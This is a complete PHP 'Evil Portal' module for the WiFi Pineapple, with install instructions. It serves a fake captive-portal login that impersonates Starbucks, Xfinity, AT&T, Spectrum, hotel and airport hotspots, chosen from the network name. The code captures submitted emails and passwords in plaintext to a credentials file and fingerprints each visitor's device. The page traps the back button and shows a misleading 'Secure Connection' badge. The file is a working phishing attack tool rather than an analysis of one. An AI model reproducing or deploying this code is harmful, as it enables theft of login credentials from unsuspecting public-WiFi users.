<?php
namespace evilportal;

/**
 * Evil Portal Universal v3.1
 * Single-file captive portal for WiFi Pineapple Evil Portal module.
 * 
 * INSTALL:
 *   1. Copy this file to: /root/pineapple/modules/EvilPortal/portals/MyPortal.php
 *   2. Pineapple UI: Modules -> Evil Portal -> Portal Library -> MyPortal -> Activate
 * 
 * FEATURES:
 *   - Universal design (works on any network)
 *   - Device auto-detection (iOS/Android/Windows/Mac/Linux icons)
 *   - Full device fingerprinting (screen, timezone, hardware, plugins)
 *   - Dark mode support
 *   - Mobile-first responsive
 *   - Back-button trap
 *   - Form validation with shake animation
 *   - Loading spinner on submit
 *   - 7 profiles: default, starbucks, xfinity, att, spectrum, hotel, airport
 *   - Auto-detect profile from SSID keywords in config.json
 *   - Credentials saved to /root/pineapple/modules/EvilPortal/logs/creds.json
 *   - Access logs to /root/pineapple/modules/EvilPortal/logs/access.log
 */

class MyPortal extends Portal
{
    private $baseDir;
    private $credsFile;
    private $logFile;
    private $configFile;

    public function __construct()
    {
        parent::__construct();
        $this->baseDir    = '/root/pineapple/modules/EvilPortal';
        $this->credsFile  = $this->baseDir . '/logs/creds.json';
        $this->logFile    = $this->baseDir . '/logs/access.log';
        $this->configFile = $this->baseDir . '/config.json';

        if (!is_dir($this->baseDir . '/logs')) {
            @mkdir($this->baseDir . '/logs', 0755, true);
        }
    }

    /* =========================================================
       FRAMEWORK HOOKS
       ========================================================= */

    /**
     * Called by Evil Portal framework on GET request.
     * Displays the captive portal login page.
     */
    public function handleAuthorization()
    {
        $profile = $this->getActiveProfile();
        $device  = $this->detectDevice($_SERVER['HTTP_USER_AGENT'] ?? '');

        $this->logEvent([
            'event'   => 'portal_load',
            'ip'      => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
            'device'  => $device,
            'profile' => $profile
        ]);

        // Persist profile selection via cookie
        setcookie('ep_profile', $profile, time() + 3600, '/');

        // Output the portal
        echo $this->renderPortal($profile, $device);
        exit;
    }

    /**
     * Called by Evil Portal framework on POST request (form submit).
     * Captures credentials, logs them, authorizes the client MAC.
     */
    public function onSuccess()
    {
        $username    = $_POST['username']    ?? '';
        $password    = $_POST['password']    ?? '';
        $fingerprint = $_POST['fingerprint'] ?? '';
        $profile     = $_POST['profile']     ?? 'default';

        // Save credentials
        $this->saveCredentials($username, $password, $fingerprint, $profile);

        $this->logEvent([
            'event'    => 'credential_submit',
            'ip'       => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
            'username' => $username,
            'profile'  => $profile
        ]);

        // WHITELIST THE CLIENT - this is the Pineapple magic
        // The framework adds their MAC to the authorized list
        $clientIp = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
        $this->authorizeClient($clientIp);

        // Show success page
        echo $this->renderSuccess();
        exit;
    }

    /* =========================================================
       PROFILE & DEVICE DETECTION
       ========================================================= */

    private function getActiveProfile()
    {
        // 1. URL override: ?profile=starbucks
        if (!empty($_GET['profile'])) {
            return $this->sanitizeProfile($_GET['profile']);
        }

        // 2. Cookie from previous visit
        if (!empty($_COOKIE['ep_profile'])) {
            return $this->sanitizeProfile($_COOKIE['ep_profile']);
        }

        // 3. Config file
        if (file_exists($this->configFile)) {
            $cfg = @json_decode(file_get_contents($this->configFile), true);
            if (!empty($cfg['profile'])) {
                return $this->sanitizeProfile($cfg['profile']);
            }

            // Auto-detect from SSID keywords
            if (!empty($cfg['ssid'])) {
                $s = strtolower($cfg['ssid']);
                if (strpos($s, 'starbucks') !== false || strpos($s, 'sbux') !== false) return 'starbucks';
                if (strpos($s, 'xfinity')   !== false || strpos($s, 'xfi')   !== false) return 'xfinity';
                if (strpos($s, 'attwifi')   !== false || strpos($s, 'at&t')  !== false) return 'att';
                if (strpos($s, 'spectrum')  !== false || strpos($s, 'twc')   !== false) return 'spectrum';
                if (strpos($s, 'hotel')     !== false || strpos($s, 'hilton')!== false || strpos($s, 'marriott')!== false || strpos($s, 'hyatt') !== false) return 'hotel';
                if (strpos($s, 'airport')   !== false || strpos($s, 'fly')   !== false || strpos($s, 'terminal')!== false) return 'airport';
            }
        }

        return 'default';
    }

    private function sanitizeProfile($name)
    {
        $valid = ['default','starbucks','xfinity','att','spectrum','hotel','airport'];
        $clean = preg_replace('/[^a-z0-9_-]/i', '', $name);
        return in_array($clean, $valid) ? $clean : 'default';
    }

    private function detectDevice($ua)
    {
        $ua = strtolower($ua);
        if (strpos($ua, 'iphone') !== false || strpos($ua, 'ipad') !== false || strpos($ua, 'ipod') !== false) return 'ios';
        if (strpos($ua, 'android') !== false) return 'android';
        if (strpos($ua, 'windows') !== false) return 'windows';
        if (strpos($ua, 'macintosh') !== false || strpos($ua, 'mac os') !== false) return 'macos';
        if (strpos($ua, 'linux') !== false) return 'linux';
        return 'unknown';
    }

    private function getDeviceIcon($device)
    {
        $map = [
            'ios'     => '&#x1F34E;',
            'android' => '&#x1F916;',
            'windows' => '&#x1F4BB;',
            'macos'   => '&#x1F5A5;',
            'linux'   => '&#x1F427;',
            'unknown' => '&#x1F4F1;'
        ];
        return $map[$device] ?? $map['unknown'];
    }

    private function getDeviceLabel($device)
    {
        $map = [
            'ios'     => 'Apple Device',
            'android' => 'Android Device',
            'windows' => 'Windows Device',
            'macos'   => 'Mac Device',
            'linux'   => 'Linux Device',
            'unknown' => 'Mobile Device'
        ];
        return $map[$device] ?? $map['unknown'];
    }

    /* =========================================================
       DATA PERSISTENCE
       ========================================================= */

    private function saveCredentials($username, $password, $fingerprint, $profile)
    {
        $entry = [
            'timestamp'   => date('c'),
            'ip'          => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
            'username'    => $username,
            'password'    => $password,
            'fingerprint' => $fingerprint,
            'profile'     => $profile,
            'ua'          => substr($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown', 0, 250)
        ];

        $creds = [];
        if (file_exists($this->credsFile)) {
            $creds = @json_decode(file_get_contents($this->credsFile), true) ?: [];
        }
        $creds[] = $entry;

        @file_put_contents($this->credsFile, json_encode($creds, JSON_PRETTY_PRINT));
    }

    private function logEvent($data)
    {
        $entry = [
            'timestamp' => date('c'),
            'ip'        => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
            'ua'        => substr($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown', 0, 200),
            'path'      => $_SERVER['REQUEST_URI'] ?? '/',
            'data'      => $data
        ];
        @file_put_contents($this->logFile, json_encode($entry) . "\n", FILE_APPEND);
    }

    /* =========================================================
       HTML RENDERERS
       ========================================================= */

    private function renderPortal($profile, $device)
    {
        $icon  = $this->getDeviceIcon($device);
        $label = $this->getDeviceLabel($device);
        $escProfile = htmlspecialchars($profile);

        return '<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="format-detection" content="telephone=no">
<title>Sign in &ndash; Network Access</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{
  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
  background:#0f172a;
  min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px;
}
.card{
  background:#fff;width:100%;max-width:420px;border-radius:20px;
  box-shadow:0 25px 50px -12px rgba(0,0,0,0.5);overflow:hidden;
  animation:slideUp 0.55s cubic-bezier(0.16,1,0.3,1);
}
@keyframes slideUp{
  from{opacity:0;transform:translateY(30px) scale(0.97)}
  to{opacity:1;transform:translateY(0) scale(1)}
}
.header{
  background:linear-gradient(135deg,#6366f1 0%,#8b5cf6 50%,#a855f7 100%);
  padding:32px 24px 28px;text-align:center;color:#fff;position:relative;
}
.header::after{
  content:"";position:absolute;bottom:-12px;left:50%;transform:translateX(-50%);
  width:64px;height:4px;background:rgba(255,255,255,0.4);border-radius:2px;
}
.wifi-pulse{
  font-size:42px;margin-bottom:10px;display:inline-block;
  animation:pulse 2s ease-in-out infinite;
}
@keyframes pulse{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.15);opacity:0.8}}
.header h1{font-size:22px;font-weight:600;letter-spacing:-0.3px}
.header p{font-size:13px;opacity:0.85;margin-top:4px}
.body{padding:28px 24px 24px}
.device-badge{
  display:flex;align-items:center;justify-content:center;gap:8px;
  background:#f1f5f9;border:1px solid #e2e8f0;border-radius:10px;
  padding:10px 14px;margin-bottom:22px;font-size:13px;color:#475569;font-weight:500;
}
.device-badge span:first-child{font-size:18px}
.field-group{margin-bottom:18px}
.field-group label{
  display:block;font-size:12px;font-weight:600;color:#334155;
  text-transform:uppercase;letter-spacing:0.4px;margin-bottom:6px;
}
.field-group input{
  width:100%;padding:13px 15px;border:1.5px solid #cbd5e1;border-radius:12px;
  font-size:16px;color:#0f172a;background:#fff;
  transition:border-color 0.2s,box-shadow 0.2s,background 0.2s;-webkit-appearance:none;
}
.field-group input:focus{
  outline:none;border-color:#6366f1;
  box-shadow:0 0 0 4px rgba(99,102,241,0.12);background:#fafaff;
}
.field-group input::placeholder{color:#94a3b8}
.options{
  display:flex;justify-content:space-between;align-items:center;
  margin-bottom:22px;font-size:13px;
}
.remember{display:flex;align-items:center;gap:8px;color:#475569;cursor:pointer;font-weight:500}
.remember input{width:18px;height:18px;accent-color:#6366f1;cursor:pointer}
.forgot{color:#6366f1;text-decoration:none;font-weight:600;font-size:13px}
.forgot:hover{color:#4f46e5;text-decoration:underline}
.btn{
  width:100%;padding:15px;background:linear-gradient(135deg,#6366f1 0%,#8b5cf6 100%);
  color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:700;
  cursor:pointer;transition:transform 0.15s,box-shadow 0.2s,filter 0.2s;
  position:relative;overflow:hidden;
}
.btn:hover{transform:translateY(-2px);box-shadow:0 10px 25px -5px rgba(99,102,241,0.45);filter:brightness(1.05)}
.btn:active{transform:translateY(0)}
.btn:disabled{opacity:0.7;cursor:not-allowed;transform:none}
.btn .spinner{display:none;width:18px;height:18px;border:2.5px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto}
@keyframes spin{to{transform:rotate(360deg)}}
.terms{text-align:center;font-size:11px;color:#94a3b8;margin-top:20px;line-height:1.5}
.terms a{color:#6366f1;text-decoration:none;font-weight:500}
.terms a:hover{text-decoration:underline}
.bottom{text-align:center;margin-top:18px;padding-top:18px;border-top:1px solid #f1f5f9;font-size:12px;color:#94a3b8}
.bottom strong{color:#64748b}
@media (max-width:480px){
  body{padding:0;background:#fff}
  .card{border-radius:0;box-shadow:none;max-width:100%;min-height:100vh;display:flex;flex-direction:column}
  .header{border-radius:0}
  .body{flex:1}
}
@media (prefers-color-scheme:dark){
  body{background:#020617}
  .card{background:#0f172a;border:1px solid #1e293b}
  .header{background:linear-gradient(135deg,#4f46e5 0%,#7c3aed 50%,#9333ea 100%)}
  .device-badge{background:#1e293b;border-color:#334155;color:#94a3b8}
  .field-group label{color:#e2e8f0}
  .field-group input{background:#1e293b;border-color:#334155;color:#f1f5f9}
  .field-group input:focus{background:#1e293b;border-color:#6366f1}
  .field-group input::placeholder{color:#64748b}
  .remember{color:#94a3b8}
  .terms{color:#64748b}
  .bottom{border-top-color:#1e293b;color:#64748b}
  .bottom strong{color:#94a3b8}
}
.shake{animation:shake 0.5s cubic-bezier(0.36,0.07,0.19,0.97) both}
@keyframes shake{10%,90%{transform:translateX(-1px)}20%,80%{transform:translateX(2px)}30%,50%,70%{transform:translateX(-4px)}40%,60%{transform:translateX(4px)}}
</style>
</head>
<body>
<div class="card">
  <div class="header">
    <div class="wifi-pulse">&#x1F4F6;</div>
    <h1>Network Login</h1>
    <p>Sign in to continue browsing</p>
  </div>
  <div class="body">
    <div class="device-badge">
      <span>' . $icon . '</span>
      <span>' . $label . ' Detected &middot; Secure Connection</span>
    </div>
    <form id="loginForm" method="POST" action="" autocomplete="on">
      <input type="hidden" name="fingerprint" id="fp" value="">
      <input type="hidden" name="profile" value="' . $escProfile . '">

      <div class="field-group">
        <label for="username">Email or Phone Number</label>
        <input type="text" id="username" name="username" 
               placeholder="you@example.com" required 
               autocomplete="username" inputmode="email">
      </div>

      <div class="field-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" 
               placeholder="Enter your password" required 
               autocomplete="current-password">
      </div>

      <div class="options">
        <label class="remember">
          <input type="checkbox" name="remember" checked>
          Stay connected
        </label>
        <a href="#" class="forgot">Need help?</a>
      </div>

      <button type="submit" class="btn" id="submitBtn">
        <span id="btnText">Connect to Network</span>
        <div class="spinner" id="btnSpinner"></div>
      </button>
    </form>

    <div class="terms">
      By connecting, you agree to the <a href="#">Terms of Service</a> 
      and <a href="#">Privacy Policy</a>.
    </div>

    <div class="bottom">
      <p>Need assistance? Contact your network administrator</p>
      <p><strong>1-800-NET-HELP</strong> &middot; Available 24/7</p>
    </div>
  </div>
</div>

<script>
(function(){
  "use strict";

  function getFP(){
    return JSON.stringify({
      screen:{w:screen.width,h:screen.height,d:screen.colorDepth,aw:screen.availWidth,ah:screen.availHeight},
      nav:{ua:navigator.userAgent,plat:navigator.platform,lang:navigator.language,
           hw:navigator.hardwareConcurrency||"?",mem:navigator.deviceMemory||"?",
           touch:navigator.maxTouchPoints||0,vendor:navigator.vendor||"?"},
      tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
      tzOff:new Date().getTimezoneOffset(),
      touch:"ontouchstart"in window,
      cookies:navigator.cookieEnabled,
      online:navigator.onLine,
      plugins:(navigator.plugins?Array.from(navigator.plugins).map(function(p){return p.name}):[]),
      ref:document.referrer||"direct",
      ts:new Date().toISOString()
    });
  }

  var fpEl=document.getElementById("fp");
  if(fpEl)fpEl.value=getFP();

  var first=document.getElementById("username");
  if(first)setTimeout(function(){first.focus();},250);

  var form=document.getElementById("loginForm");
  var btn=document.getElementById("submitBtn");
  var txt=document.getElementById("btnText");
  var spin=document.getElementById("btnSpinner");

  if(form){
    form.addEventListener("submit",function(e){
      var u=document.getElementById("username").value.trim();
      var p=document.getElementById("password").value;
      if(!u||!p){
        e.preventDefault();
        form.classList.add("shake");
        setTimeout(function(){form.classList.remove("shake");},500);
        return;
      }
      btn.disabled=true;
      txt.style.display="none";
      spin.style.display="block";
    });
  }

  history.pushState(null,null,location.href);
  window.addEventListener("popstate",function(){history.pushState(null,null,location.href);});

})();
</script>
</body>
</html>';
    }

    private function renderSuccess()
    {
        return '<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Connected</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
  background:#0f172a;min-height:100vh;
  display:flex;align-items:center;justify-content:center;padding:20px;
}
.card{
  background:#fff;width:100%;max-width:400px;border-radius:20px;
  box-shadow:0 25px 50px -12px rgba(0,0,0,0.5);
  padding:56px 32px;text-align:center;
  animation:slideUp 0.5s ease-out;
}
@keyframes slideUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
.check{
  width:72px;height:72px;
  background:linear-gradient(135deg,#22c55e 0%,#16a34a 100%);
  border-radius:50%;display:flex;align-items:center;justify-content:center;
  margin:0 auto 20px;font-size:36px;color:#fff;
  animation:pop 0.4s cubic-bezier(0.175,0.885,0.32,1.275);
}
@keyframes pop{from{transform:scale(0)}to{transform:scale(1)}}
h1{font-size:24px;color:#0f172a;margin-bottom:8px}
p{color:#64748b;font-size:15px;margin-bottom:6px}
.redirect{font-size:13px;color:#94a3b8;margin-top:16px}
.bar{width:100%;height:4px;background:#e2e8f0;border-radius:2px;margin-top:20px;overflow:hidden}
.fill{height:100%;width:0%;background:linear-gradient(90deg,#6366f1,#8b5cf6);animation:load 4s linear forwards}
@keyframes load{to{width:100%}}
@media (prefers-color-scheme:dark){
  body{background:#020617}
  .card{background:#0f172a;border:1px solid #1e293b}
  h1{color:#f1f5f9}
  p{color:#94a3b8}
  .redirect{color:#64748b}
  .bar{background:#1e293b}
}
</style>
</head>
<body>
<div class="card">
  <div class="check">&#x2713;</div>
  <h1>Connection Successful</h1>
  <p>You are now connected to the network.</p>
  <p class="redirect">Opening browser in <span id="c">4</span>...</p>
  <div class="bar"><div class="fill"></div></div>
</div>
<script>
var c=4,el=document.getElementById("c");
var t=setInterval(function(){
  c--;if(el)el.textContent=c;
  if(c<=0){clearInterval(t);window.location.href="https://www.google.com";}
},1000);
</script>
</body>
</html>';
    }
}
